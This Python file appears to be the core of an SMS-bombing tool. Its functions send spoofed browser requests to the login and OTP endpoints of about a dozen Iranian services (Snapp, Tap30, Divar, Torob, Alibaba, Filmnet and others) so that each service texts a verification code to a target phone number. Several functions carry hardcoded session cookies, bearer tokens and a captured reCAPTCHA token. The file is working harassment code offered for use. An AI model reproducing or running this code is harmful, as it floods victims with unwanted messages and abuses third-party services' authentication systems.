from platform import node, system, release; Node, System, Release = node(), system(), release() 
from os import system, name; system('clear' if name == 'posix' else 'cls')
from re import match, sub
from threading import Thread, active_count
import urllib3; urllib3.disable_warnings()
from time import sleep
try:
    from requests import get, post
except ImportError:
    system("python3 -m pip install requests")   
def snap(phone):
    snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
    snapD = {"cellphone":phone}
    try:
        snapR = post(timeout=5, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD).text
        if "OK" in snapR:
            print(f'{g}(Snap) {w}Code Was Sent')
            return True
    except:
        pass
def gap(phone):
    gapH = {"Host": "core.gap.im","accept": "application/json, text/plain, */*","x-version": "4.5.7","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","appversion": "web","origin": "https://web.gap.im","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.gap.im/","accept-encoding": "gzip, deflate, br"}
    try:
        gapR = get(timeout=5, url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH).text
        if "OK" in gapR:
            print(f'{g}(Gap) {w}Code Was Sent')
            return True
    except:
        pass
def tap30(phone):
    tap30H = {"Host": "tap33.me","Connection": "keep-alive","Content-Length": "63","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "application/json","Accept": "*/*","Origin": "https://app.tapsi.cab","Sec-Fetch-Site": "cross-site","Sec-Fetch-Mode": "cors","Sec-Fetch-Dest": "empty","Referer": "https://app.tapsi.cab/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
    tap30D = {"credential":{"phoneNumber":"0"+phone.split("+98")[1],"role":"PASSENGER"}}
    try:
        tap30R = post(timeout=5, url="https://tap33.me/api/v2/user", headers=tap30H, json=tap30D).json()
        if tap30R['result'] == "OK":
            print(f'{g}(Tap30) {w}Code Was Sent')
            return True
    except:
        pass
    
def divar(phone):
    #divar api
    divarH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'application/x-www-form-urlencoded',
'origin': 'https://divar.ir',
'referer': 'https://divar.ir/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
'x-standard-divar-error': 'true'}
    divarD = {"phone":phone.split("+98")[1]}
    try:
        divarR = post(timeout=5, url="https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD).json()
        if divarR["authenticate_response"] == "AUTHENTICATION_VERIFICATION_CODE_SENT":
            print(f'{g}(Divar) {w}Code Was Sent')
            return True
    except:
        pass
    
def torob(phone):
    phone = '0'+phone.split('+98')[1]
    torobH = {'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'cookie': 'abtest=next_pwa; search_session=ofwjiyqqethomevqrgzxvopjtgkgimdc; _gcl_au=1.1.805505755.1639260830; _gid=GA1.2.683761449.1639260830; _gat_UA-105982196-1=1; _ga_CF4KGKM3PG=GS1.1.1639260830.1.0.1639260830.0; _clck=130ifw1|1|ex6|0; _ga=GA1.2.30224238.1639260830',
'origin': 'https://torob.com',
'referer': 'https://torob.com/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        torobR = get(timeout=5, url=f"https://api.torob.com/a/phone/send-pin/?phone_number={phone}", headers=torobH).json()
        if torobR["message"] == "pin code sent":
            print(f'{g}(Torob) {w}Code Was Sent')
            return True
    except:
        pass
    
def snapfood(phone):
    sfoodU = 'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa'
    sfoodH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjYxZTA5NjE5ZjVmZTNkNmRlOTMwYTQwY2I5NzdlMTBhYWY2Y2MxYWIzYTNhNjYxM2U2YWFmZGNkMzhhOTY0Mzg1NjZkMzIyMGQ3NDU4MTc2In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNjFlMDk2MTlmNWZlM2Q2ZGU5MzBhNDBjYjk3N2UxMGFhZjZjYzFhYjNhM2E2NjEzZTZhYWZkY2QzOGE5NjQzODU2NmQzMjIwZDc0NTgxNzYiLCJpYXQiOjE2MzkzMTQ4NjMsIm5iZiI6MTYzOTMxNDg2MywiZXhwIjoxNjQxOTkzMzgzLCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.aRR7PRnrh-hfQEhkG2YnN_AJL3AjGsI2LmWwRufsvnD6enxPGJQXyZFn9MoH3OSBPmgXFMoHmCnbXvxoDA5jeRdmUvy4swLbKZf7mfv2Zg4CEQusIGgBHeqMmI31H2PIhCLPtShg0trGgzs-BUCArzMM6TV7s1P6GKMhSyXXVzxj8duJxdiNTVx5IeO8GAo8hpt6pojbp3q07xhECgK-8-3n8qevV9CRBtIwhkhqrcubgrQk6ot64ksiosVhHhvI-xVm1AW8hArI62VcEv-13AH92e9n30auYYKC961wRU6_FUFzauHqSXlhWBgZo6-uO9gwrLA7g0_91G8Eu98V4cKsVWZaRLRP1-tQE9otJduaSvEF4e88FdgW3A045Bd0I2F5Uri2WEemVyMV8CVT8Kdio6iBwGl8dLQS7SJhK7OYwTp_S7AZ9A4wJJbTuw-rU4_ykM2PlR5tNXwTNpcEdiLdglFsv9c0NOyClMIsAU7t7NcYcxdQ5twSDWPUmKK-k0xZMdeACUclkYYFNPqGSccGX0jpioyET0sMFrHQyeOvHxGPLfMeoTaXUA8LMognQ3oCWCsZHrcaQSJJ7H9WUIf4SYUvRwp-RE4JUxpOXvxgPjk0b1VUYF0dHjf1C-uQ3D7aYEAuzSW0JWyEFhurNpBaeQQhf35HH-SchuWCjafAr8rU0BCNkQJd4aresr7moHos1a_KoeQ2Y1HloPzsjOzRSpK97vApN0naRwK8k9RsoN65URZDbEzTc1b2dpTUR-VJw7lU0v5jT_PvZs7GUnpnv23UrYQIfMKISF9suy6ufb26DdIAr2pLOQ9NKqxb4QwDadFa1gPIpb_QU-8hL6N9533YTvTE8xJJjjwE6IQutNsZ1OdBdrj4APjNczDpb3PFaXtI0CbOKHYIUDsdyEIdF1o9RYrKYj-EP61SA0gzks-qYGJR1jnfQRkwkqoolu2lvDK0PxDXnM4Crd4kJRxVtrsD0P8P-jEvW6PYAmxXPtnsu5zxSMnllNNeOOAijcxG6IyPW-smsHV-6BAdk5w3FXAPe0ZcuDXb0gZseq2-GnqxmNDmRWyHc9TuGhAhWdxaP-aNm6MmoSVJ-G6fLsjXY3KLaRnIhmNfABxqcx0f03g6sBIh_1Rw965_WydlsMVU_K5-AIfsXPSxSmVnIPrN4VasUnp3XbJmnO9lm_rrpdNAM3VK20UPLCpxI7Ymxdl9wboAg8cdPlyBxIcClwtui0RC1FGZ-GpvVzWZDq_Mu6UEbU3bfi9Brr5CJ-0aa8McOK8TJBHCqfLHYOOqAruaLHhNR0fjw-bIzHLKtxGhwkkGp7n_28HtbiZVKqr48rBfbhzanCpSPYGDV4PM1_zrJDUJn4sRitw_Z78Lju3ssjuMae8zAEdHUCHGui_tYMABlPVaZhsB4s-KahT4aTOhzd7ejjoLE9WQUSuQBmMTGFZM0xH0Phyz1vSl7_5IpTHcCwTXUx3s8UvRB-Q3QQBa5O82gtZWTd56R7u0YrCJKVEnsf9a9lZz9Of6R4YdPhwByMvHFfbRLgNkuGzv75dZZf24KmbPTZN4sVCZgxD7oO0sTgh2hEYMSmdHnXvCySXZk_1G52yP8S7IwnEXRq_Hu1aje2dz0FRWYFR8nnmFuRyYSfj1rSy1Vut4ktNUsstlAYn8QmsvNqyn402aikpuG6s0ApOGMuLChv_BDd_tbsLu11-qLv3r5Exza9XJMq4aOFegpPJ5vH75entTpxPa16gmJ80lhlvKux0vnZI-mEDZ8zEI5uXi26zv4taUqLNw5nXQZbi8sxh90nYF1fNAQ-ERHQmoUeqAwL9AuZobvR7pRMmmjZMPeeDPPFrNDyCHYFO_Iu5kClQM_7jzmsLkOvCD68DkwhwftkNvTiA-dDqkkNpY8OB0GI4ynhrAqHN4Y378qbks7q4ifUU1NsSI5xdkHC4fseKMJTnnCYdyfhH14_X46zuAvSIL7DX262VTb6dAIN5KoHkjacc77Z4V7HsncWBysaXqK5yUIkL3JB5AiZlp8nV0_hCjNfA3QsfGQVoMYYeoTIutKF9Hr9r1efOXmTU0URZ-C6LYgzcntKlryroLwVg5jP3s2jQyCTIvs4CitUAyJEC3VyeW_VlSA02uMqxB-pjkipGEKe3KO1diCU7afe0xkd5C4K1NG-kLAbRAhCCtLRVJVSP0a_t84F737B9lub6bs5QcCvxARlfogXerUg9MjMU9qCWLzN9x2MukbsijxzmsGFcw-OBecMETDwoyB_0HrxP95QCwxw_X4rcW60HL45xbv9iC-gsn1qd-FKzO-XSYU0VWprr_z12bl9QOnpMc6OYf74IeJ27zl1nWR_gLo-Wg-WeFDyWcpNjmiHZkHYiDa1c3RgFv2t4ezYP0tsQEzLy-Yx0yB7WI5Z2kd_cSuaX73U9PW7rOCGnCD9cfyxZ27VyiHx8YMKKch6lyNmwPGfMhYqgMMo4NLmKy44taXRKPV20DhIsuNdMPcPUofrrrTsKarxurCX8EwRev4Ox-GcP-ocFtjKq_jkGRnqh4QQrJJh3Unpxm3sHcWhIWkNIcyChdjwnHPqKLb49UbVyJKxkt26E-cuO7_oC7PbMe8YjKFrmr2_igqr9i-YioVy1MdI5TL9sZhS8bMwG2rMozBYqWT9czRIKwabP9dUKpEn-d1nLbdrEeSzXOLYtXutiO57lGpxTDgf3ELp1zIEvTW7SEJBQ',
'content-type': 'application/x-www-form-urlencoded',
'cookie': 'UUID=39c62f64-3d2d-4954-9033-816098559ae4; location={"id":"","latitude":"-1.000","longitude":"-1.000","mode":"Auto"}; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2BRQfjyp1DGE7w6o2UXNZHyc7XXXwZB6%2B4%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FKNDbZLoR2s9fxetSEbovoXrW2OyagTvcRyyfS%2BiAq3Wo0gtPlB2mt5jezOT0RcCuwOIS0v8tUKw%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2Bxvj2aS9mFuxvX6rDEMIsAuRecCyMypTk%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2B8so%2F5rMdojUEEuG%2BVwFrtXzXNtpojE10%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2FUIoTuPIMvAKRiGcEmnsfog8TvprQ8QJI%3D; rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX1%2FOaB1OTIgZSuGfv6Ov271AcX0ZKQWg94ey1fyJ%2Fv%2B2H09dia3Z%2BMvi; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX19W4bPJRR7lbNo2fIWRB3Gk2GDkBYASrB7u755JxTnymjQ4j%2BjxgRx0; jwt-refresh_token=undefined; jwt-token_type=Bearer; jwt-expires_in=2678399; jwt-access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6IjYxZTA5NjE5ZjVmZTNkNmRlOTMwYTQwY2I5NzdlMTBhYWY2Y2MxYWIzYTNhNjYxM2U2YWFmZGNkMzhhOTY0Mzg1NjZkMzIyMGQ3NDU4MTc2In0.eyJhdWQiOiJzbmFwcGZvb2RfcHdhIiwianRpIjoiNjFlMDk2MTlmNWZlM2Q2ZGU5MzBhNDBjYjk3N2UxMGFhZjZjYzFhYjNhM2E2NjEzZTZhYWZkY2QzOGE5NjQzODU2NmQzMjIwZDc0NTgxNzYiLCJpYXQiOjE2MzkzMTQ4NjMsIm5iZiI6MTYzOTMxNDg2MywiZXhwIjoxNjQxOTkzMzgzLCJzdWIiOiIiLCJzY29wZXMiOlsibW9iaWxlX3YyIiwibW9iaWxlX3YxIiwid2VidmlldyJdfQ.aRR7PRnrh-hfQEhkG2YnN_AJL3AjGsI2LmWwRufsvnD6enxPGJQXyZFn9MoH3OSBPmgXFMoHmCnbXvxoDA5jeRdmUvy4swLbKZf7mfv2Zg4CEQusIGgBHeqMmI31H2PIhCLPtShg0trGgzs-BUCArzMM6TV7s1P6GKMhSyXXVzxj8duJxdiNTVx5IeO8GAo8hpt6pojbp3q07xhECgK-8-3n8qevV9CRBtIwhkhqrcubgrQk6ot64ksiosVhHhvI-xVm1AW8hArI62VcEv-13AH92e9n30auYYKC961wRU6_FUFzauHqSXlhWBgZo6-uO9gwrLA7g0_91G8Eu98V4cKsVWZaRLRP1-tQE9otJduaSvEF4e88FdgW3A045Bd0I2F5Uri2WEemVyMV8CVT8Kdio6iBwGl8dLQS7SJhK7OYwTp_S7AZ9A4wJJbTuw-rU4_ykM2PlR5tNXwTNpcEdiLdglFsv9c0NOyClMIsAU7t7NcYcxdQ5twSDWPUmKK-k0xZMdeACUclkYYFNPqGSccGX0jpioyET0sMFrHQyeOvHxGPLfMeoTaXUA8LMognQ3oCWCsZHrcaQSJJ7H9WUIf4SYUvRwp-RE4JUxpOXvxgPjk0b1VUYF0dHjf1C-uQ3D7aYEAuzSW0JWyEFhurNpBaeQQhf35HH-SchuWCjafAr8rU0BCNkQJd4aresr7moHos1a_KoeQ2Y1HloPzsjOzRSpK97vApN0naRwK8k9RsoN65URZDbEzTc1b2dpTUR-VJw7lU0v5jT_PvZs7GUnpnv23UrYQIfMKISF9suy6ufb26DdIAr2pLOQ9NKqxb4QwDadFa1gPIpb_QU-8hL6N9533YTvTE8xJJjjwE6IQutNsZ1OdBdrj4APjNczDpb3PFaXtI0CbOKHYIUDsdyEIdF1o9RYrKYj-EP61SA0gzks-qYGJR1jnfQRkwkqoolu2lvDK0PxDXnM4Crd4kJRxVtrsD0P8P-jEvW6PYAmxXPtnsu5zxSMnllNNeOOAijcxG6IyPW-smsHV-6BAdk5w3FXAPe0ZcuDXb0gZseq2-GnqxmNDmRWyHc9TuGhAhWdxaP-aNm6MmoSVJ-G6fLsjXY3KLaRnIhmNfABxqcx0f03g6sBIh_1Rw965_WydlsMVU_K5-AIfsXPSxSmVnIPrN4VasUnp3XbJmnO9lm_rrpdNAM3VK20UPLCpxI7Ymxdl9wboAg8cdPlyBxIcClwtui0RC1FGZ-GpvVzWZDq_Mu6UEbU3bfi9Brr5CJ-0aa8McOK8TJBHCqfLHYOOqAruaLHhNR0fjw-bIzHLKtxGhwkkGp7n_28HtbiZVKqr48rBfbhzanCpSPYGDV4PM1_zrJDUJn4sRitw_Z78Lju3ssjuMae8zAEdHUCHGui_tYMABlPVaZhsB4s-KahT4aTOhzd7ejjoLE9WQUSuQBmMTGFZM0xH0Phyz1vSl7_5IpTHcCwTXUx3s8UvRB-Q3QQBa5O82gtZWTd56R7u0YrCJKVEnsf9a9lZz9Of6R4YdPhwByMvHFfbRLgNkuGzv75dZZf24KmbPTZN4sVCZgxD7oO0sTgh2hEYMSmdHnXvCySXZk_1G52yP8S7IwnEXRq_Hu1aje2dz0FRWYFR8nnmFuRyYSfj1rSy1Vut4ktNUsstlAYn8QmsvNqyn402aikpuG6s0ApOGMuLChv_BDd_tbsLu11-qLv3r5Exza9XJMq4aOFegpPJ5vH75entTpxPa16gmJ80lhlvKux0vnZI-mEDZ8zEI5uXi26zv4taUqLNw5nXQZbi8sxh90nYF1fNAQ-ERHQmoUeqAwL9AuZobvR7pRMmmjZMPeeDPPFrNDyCHYFO_Iu5kClQM_7jzmsLkOvCD68DkwhwftkNvTiA-dDqkkNpY8OB0GI4ynhrAqHN4Y378qbks7q4ifUU1NsSI5xdkHC4fseKMJTnnCYdyfhH14_X46zuAvSIL7DX262VTb6dAIN5KoHkjacc77Z4V7HsncWBysaXqK5yUIkL3JB5AiZlp8nV0_hCjNfA3QsfGQVoMYYeoTIutKF9Hr9r1efOXmTU0URZ-C6LYgzcntKlryroLwVg5jP3s2jQyCTIvs4CitUAyJEC3VyeW_VlSA02uMqxB-pjkipGEKe3KO1diCU7afe0xkd5C4K1NG-kLAbRAhCCtLRVJVSP0a_t84F737B9lub6bs5QcCvxARlfogXerUg9MjMU9qCWLzN9x2MukbsijxzmsGFcw-OBecMETDwoyB_0HrxP95QCwxw_X4rcW60HL45xbv9iC-gsn1qd-FKzO-XSYU0VWprr_z12bl9QOnpMc6OYf74IeJ27zl1nWR_gLo-Wg-WeFDyWcpNjmiHZkHYiDa1c3RgFv2t4ezYP0tsQEzLy-Yx0yB7WI5Z2kd_cSuaX73U9PW7rOCGnCD9cfyxZ27VyiHx8YMKKch6lyNmwPGfMhYqgMMo4NLmKy44taXRKPV20DhIsuNdMPcPUofrrrTsKarxurCX8EwRev4Ox-GcP-ocFtjKq_jkGRnqh4QQrJJh3Unpxm3sHcWhIWkNIcyChdjwnHPqKLb49UbVyJKxkt26E-cuO7_oC7PbMe8YjKFrmr2_igqr9i-YioVy1MdI5TL9sZhS8bMwG2rMozBYqWT9czRIKwabP9dUKpEn-d1nLbdrEeSzXOLYtXutiO57lGpxTDgf3ELp1zIEvTW7SEJBQ; crisp-client%2Fsession%2F4df7eed4-f44a-4e3d-a5cc-98ec87b592bc=session_69ff5918-b549-4c78-89fd-b851ca35bdf6; crisp-client%2Fsocket%2F4df7eed4-f44a-4e3d-a5cc-98ec87b592bc=0',
'origin': 'https://snappfood.ir',
'referer': 'https://snappfood.ir/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    sfoodD = {"cellphone": "0"+phone.split("+98")[1]}
    try:
        sfoodR = post(timeout=5, url=sfoodU, headers=sfoodH, data=sfoodD).json()
        if sfoodR['status'] == True:
            print(f'{g}(SnapFood) {w}Code Was Sent')
            return True
    except:
        pass
    
def sheypoor(phone):
    sheyporH = {"Host": "www.sheypoor.com","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "*/*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Content-Length": "62","Origin": "https://www.sheypoor.com","Connection": "keep-alive","Referer": "https://www.sheypoor.com/session","Cookie": "plog=False; _lba=false; AMP_TOKEN=%24NOT_FOUND; ts=46f5e500c49277a72f267de92dd51238; track_id=22f97cea33f34e368e4b3edd23afd391; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=3f475c6e-f55b-0d29-de67-6cdc46bc6592; analytics_token=3cce634d-040a-baf3-fdd6-552578d672df; yektanet_session_last_activity=8/13/2020; _yngt=0bc37b56-6478-488b-c801-521f101259fd; _lbsa=false; _ga=GA1.2.1464689488.1597346921; _gid=GA1.2.1551213293.1597346921; _gat=1","TE": "Trailers"}
    sheyporD = {"username" : "0"+phone.split("+98")[1]}
    try:
        sheyporR = post(timeout=5, url='https://www.sheypoor.com/auth', headers=sheyporH, data=sheyporD).json()
        if sheyporR['success'] == True:
            print(f'{g}(Sheypoor) {w}Code Was Sent')
            return True
    except:
        pass

def okorosh(phone):
    okJ = {
    "mobile": "0"+phone.split("+98")[1],
    "g-recaptcha-response": "03AGdBq255m4Cy9SQ1L5cgT6yD52wZzKacalaZZw41D-jlJzSKsEZEuJdb4ujcJKMjPveDKpAcMk4kB0OULT5b3v7oO_Zp8Rb9olC5lZH0Q0BVaxWWJEPfV8Rf70L58JTSyfMTcocYrkdIA7sAIo7TVTRrH5QFWwUiwoipMc_AtfN-IcEHcWRJ2Yl4rT4hnf6ZI8QRBG8K3JKC5oOPXfDF-vv4Ah6KsNPXF3eMOQp3vM0SfMNrBgRbtdjQYCGpKbNU7P7uC7nxpmm0wFivabZwwqC1VcpH-IYz_vIPcioK2vqzHPTs7t1HmW_bkGpkZANsKeDKnKJd8dpVCUB1-UZfKJVxc48GYeGPrhkHGJWEwsUW0FbKJBjLO0BdMJXHhDJHg3NGgVHlnOuQV_wRNMbUB9V5_s6GM_zNDFBPgD5ErCXkrE40WrMsl1R6oWslOIxcSWzXruchmKfe"
}
    okU = 'https://my.okcs.com/api/check-mobile'
    okH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'application/json;charset=UTF-8',
'cookie': '_ga=GA1.2.1201761975.1639324247; XSRF-TOKEN=eyJpdiI6IllzYkQvdHJ5NVp3M1JyZmYweWFDTGc9PSIsInZhbHVlIjoiZ0wxQUZjR2ZzNEpPenFUZUNBZC95c2RFaEt4Y2x4VWJ2QlBmQ1ZIbUJHV2VEOGt0VG1XMXBaOVpJUFBkK2NOZmNvckxibDQ5cDkxc2ZJRkhJQUY4RlBicU80czIvZWhWZm1OSnJZMXZEbXE4TnlVeGZUSDhSYU9PRzZ6QzZGMkYiLCJtYWMiOiI2NWZlOTkxMTBjZDA5NzkyNDgwMjk2NGEwMDQzMGVhM2U1ODEzNmQ1YjExY2Q1ODc5MDFmZDBhMmZjMjQwY2JjIn0%3D; myokcs_session=eyJpdiI6InlYaXBiTUw1dHFKM05rN0psNjlwWXc9PSIsInZhbHVlIjoiNDg1QWJQcGwvT3NUOS9JU1dSZGk2K2JkVlNVV2wrQWxvWGVEc0d1MDR1aTNqVSs4Z0llSDliMW04ZFpGTFBUOG82NEJNMVFmTmNhcFpzQmJVTkpQZzVaUEtkSnFFSHU0RFprcXhWZlY0Zit2UHpoaVhLNXdmdUZYN1RwTnVLUFoiLCJtYWMiOiI5NTUwMmI2NDhkNWJjNDgwOGNmZjQxYTI4YjA0OTFjNTQ5NDc0YWJiOWIwZmI4MTViMWM0NDA4OGY5NGNhOGIzIn0%3D',
'origin': 'https://my.okcs.com',
'referer': 'https://my.okcs.com/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33',
'x-requested-with': 'XMLHttpRequest',
'x-xsrf-token': 'eyJpdiI6IllzYkQvdHJ5NVp3M1JyZmYweWFDTGc9PSIsInZhbHVlIjoiZ0wxQUZjR2ZzNEpPenFUZUNBZC95c2RFaEt4Y2x4VWJ2QlBmQ1ZIbUJHV2VEOGt0VG1XMXBaOVpJUFBkK2NOZmNvckxibDQ5cDkxc2ZJRkhJQUY4RlBicU80czIvZWhWZm1OSnJZMXZEbXE4TnlVeGZUSDhSYU9PRzZ6QzZGMkYiLCJtYWMiOiI2NWZlOTkxMTBjZDA5NzkyNDgwMjk2NGEwMDQzMGVhM2U1ODEzNmQ1YjExY2Q1ODc5MDFmZDBhMmZjMjQwY2JjIn0='}
    try:
        okR = post(timeout=5, url=okU, headers=okH, json=okJ).text
        if 'success' in okR:
            print(f'{g}(OfoghKourosh) {w}Code Was Sent')
            return True
    except:
        pass
    
def alibaba(phone):
    alibabaH = {"Host": "ws.alibaba.ir","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "application/json, text/plain, */*","Accept-Language": "en-US,en;q=0.5","Accept-Encoding": "gzip, deflate, br","ab-channel": "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR","ab-alohomora": "MTMxOTIzNTI1MjU2NS4yNTEy","Content-Type": "application/json;charset=utf-8","Content-Length": "29","Origin": "https://www.alibaba.ir","Connection": "keep-alive","Referer": "https://www.alibaba.ir/hotel"}
    alibabaD = {"phoneNumber":"0"+phone.split("+98")[1]}
    try:
        alibabaR = post(timeout=5, url='https://ws.alibaba.ir/api/v3/account/mobile/otp', headers=alibabaH, json=alibabaD ).json()
        if alibabaR["result"]["success"] == True:
            print(f'{g}(AliBaba) {w}Code Was Sent')
            return True
    except:
        pass

def smarket(phone):
    smarketU = f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{phone.split("+98")[1]}'
    smarketH = {'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'text/plain;charset=UTF-8',
'origin': 'https://snapp.market',
'referer': 'https://snapp.market/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
    try:
        smarketR = post(timeout=5, url=smarketU, headers=smarketH).json()
        if smarketR['status'] == True:
            print(f'{g}(SnapMarket) {w}Code Was Sent')
            return True
    except:
        pass
    
def gapfilm(phone):
    gaJ = {
    "Type": 3,
    "Username": phone.split("+98")[1],
    "SourceChannel": "GF_WebSite",
    "SourcePlatform": "desktop",
    "SourcePlatformAgentType": "Opera",
    "SourcePlatformVersion": "82.0.4227.33",
    "GiftCode": None
}
    gaU = 'https://core.gapfilm.ir/api/v3.1/Account/Login'
    gaH = {'Accept': 'application/json, text/plain, */*',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'fa',
'Browser': 'Opera',
'BrowserVersion': '82.0.4227.33',
'Connection': 'keep-alive',
'Content-Type': 'application/json',
'Host': 'core.gapfilm.ir',
'IP': '185.156.172.170',
'Origin': 'https://www.gapfilm.ir',
'OS': 'Linux',
'Referer': 'https://www.gapfilm.ir/',
'SourceChannel': 'GF_WebSite',
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
    try:
        gaR = post(timeout=5, url=gaU, headers=gaH, json=gaJ).json()
        if gaR['Code'] == 1:
            print(f'{g}(GapFilm) {w}Code Was Sent')
            return True
    except:
        pass
def sTrip(phone):
    sTripH = {"Host": "www.snapptrip.com","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0","Accept": "*/*","Accept-Language": "fa","Accept-Encoding": "gzip, deflate, br","Content-Type": "application/json; charset=utf-8","lang": "fa","X-Requested-With": "XMLHttpRequest","Content-Length": "134","Origin": "https://www.snapptrip.com","Connection": "keep-alive","Referer": "https://www.snapptrip.com/","Cookie": "route=1597937159.144.57.429702; unique-cookie=KViXnCmpkTwY7rY; appid=g*-**-*; ptpsession=g--196189383312301530; _ga=GA1.2.118271034.1597937174; _ga_G8HW6QM8FZ=GS1.1.1597937169.1.0.1597937169.60; _gid=GA1.2.561928072.1597937182; _gat_UA-107687430-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=445b5d83-abeb-7ffd-091e-ea1ce5cfcb52; analytics_token=2809eef3-a3cf-7b9c-4191-8d8be8e5c6b7; yektanet_session_last_activity=8/20/2020; _hjid=b1148e0d-8d4b-4a3d-9934-0ac78569f4ea; _hjAbsoluteSessionInProgress=0; MEDIAAD_USER_ID=6648f107-1407-4c83-97a1-d39c9ec8ccad","TE": "Trailers"}
    sTripD = {"lang":"fa","country_id":"860","password":"snaptrippass","mobile_phone":"0"+phone.split("+98")[1],"country_code":"+98","email":"example@gmail.com"}
    try:
        sTripR = post(timeout=5, url='https://www.snapptrip.com/register', headers=sTripH, json=sTripD).json()
        if sTripR['status_code'] == 200:
            print(f'{g}(Strip) {w}Code Was Sent')
            return True
    except:
        pass

def filmnet(phone):
    fnU = f"https://api-v2.filmnet.ir/access-token/users/{phone}/otp"
    fNh = {'Connection': 'keep-alive',
    'Accept': 'application/json, text/plain, */*',
    'DNT': '1',
    'X-Platform': 'Web',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
    'Origin': 'https://filmnet.ir',
    'Sec-Fetch-Site': 'same-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://filmnet.ir/',
    'Accept-Language': 'fa,en-US;q=0.9,en;q=0.8',
    'Cache-Control': 'no-cache',
    'Accept-Encoding': 'gzip, deflate'}
    try:
        Filmnet = get(timeout=5, url=fnU, headers=fNh).json()
        if Filmnet['meta']['operation_result'] == 'success':
            print(f'{g}(Filmnet) {w}Code Was Sent')
            return True
    except:
        pass

